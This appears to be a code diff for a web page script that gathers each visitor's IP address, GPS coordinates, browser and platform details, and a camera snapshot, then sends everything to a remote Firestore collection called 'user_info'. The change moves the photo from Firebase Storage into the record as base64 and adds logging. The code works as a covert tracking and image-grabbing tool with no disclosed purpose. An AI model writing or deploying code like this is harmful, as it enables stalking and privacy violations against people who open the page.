@@ -17,7 +17,6 @@
         // Import Firebase SDK modules
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js';
         import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-firestore.js';
-        import { getStorage, ref, uploadString, getDownloadURL } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-storage.js';
 
         // Firebase Configuration
         const firebaseConfig = {
@@ -33,43 +32,52 @@
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const storage = getStorage(app);
 
         // Function to collect user data
         async function collectUserData() {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ipAddress = ipData.ip;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                console.log("IP Address:", ipAddress);
 
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    console.log("Latitude:", latitude, "Longitude:", longitude);
 
-                const userAgent = navigator.userAgent;
-                const osType = navigator.platform;
+                    const userAgent = navigator.userAgent;
+                    const osType = navigator.platform;
 
-                const userData = {
-                    ipAddress: ipAddress,
-                    locationLatitude: latitude,
-                    locationLongitude: longitude,
-                    deviceModel: "Unknown",
-                    osType: osType,
-                    browserInfo: userAgent,
-                    timestamp: new Date().toISOString(),
-                };
+                    const userData = {
+                        ipAddress: ipAddress,
+                        locationLatitude: latitude,
+                        locationLongitude: longitude,
+                        deviceModel: "Unknown", // device model not always available
+                        osType: osType,
+                        browserInfo: userAgent,
+                        timestamp: new Date().toISOString(),
+                    };
 
-                try {
-                    // Capture image from user's camera
-                    const imageUrl = await captureImage();
-                    userData.imageUrl = imageUrl; // Add image URL to user data
+                    try {
+                        // Capture image from user's camera
+                        const imageBase64 = await captureImage();
+                        console.log("Captured Image Base64:", imageBase64);
+                        userData.imageBase64 = imageBase64; // Add image base64 to user data
 
-                    // Add document to Firestore
-                    await addDoc(collection(db, "user_info"), userData);
-                    console.log("Document written successfully!");
-                } catch (error) {
-                    console.error("Error writing document: ", error);
-                }
-            });
+                        // Add document to Firestore
+                        await addDoc(collection(db, "user_info"), userData);
+                        console.log("Document written successfully!", userData);
+                    } catch (error) {
+                        console.error("Error capturing image:", error);
+                    }
+                }, (error) => {
+                    console.error("Geolocation error:", error);
+                });
+
+            } catch (error) {
+                console.error("Error fetching IP:", error);
+            }
         }
 
         // Function to capture a single image from the user's camera
@@ -90,17 +98,7 @@
                                 const reader = new FileReader();
                                 reader.onloadend = () => {
                                     const imageBase64 = reader.result;
-                                    // Upload the image to Firebase Storage
-                                    const imageRef = ref(storage, 'user_photos/photo_' + Date.now() + '.jpg');
-                                    uploadString(imageRef, imageBase64, 'data_url')
-                                        .then(async (snapshot) => {
-                                            // Get the download URL of the uploaded image
-                                            const imageUrl = await getDownloadURL(imageRef);
-                                            resolve(imageUrl);
-                                        })
-                                        .catch((error) => {
-                                            reject(error);
-                                        });
+                                    resolve(imageBase64);
                                 };
                                 reader.readAsDataURL(blob);
                             })
